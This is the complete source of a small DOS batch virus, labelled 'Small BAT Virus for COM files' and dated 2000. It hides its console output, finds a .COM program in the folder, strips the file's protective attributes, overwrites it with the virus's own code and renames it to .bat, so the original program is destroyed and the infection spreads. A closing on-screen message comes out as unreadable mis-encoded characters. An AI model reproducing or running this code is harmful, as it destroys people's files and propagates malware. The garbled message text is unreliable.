:Small BAT Virus for COM files
:(c) Steel by 2000 year
@ctty nul
for %%q in (*.COM) do set AfGan=%%q
attrib %afGan% -h -r -a -s
copy %0 %AfGan%
for %%w in (%AfGan%) do find "AfGan" %%w
ren %AfGan% *.bat
@ctty con
cls
@echo.
@echo  旼컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴커
@echo  퀙� 蝨좓恂� ��誓쩆筍 캙�젹β贍 歲飡�Л�с ㄾ飡承� 誓α循�... �
@echo  읕컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴켸
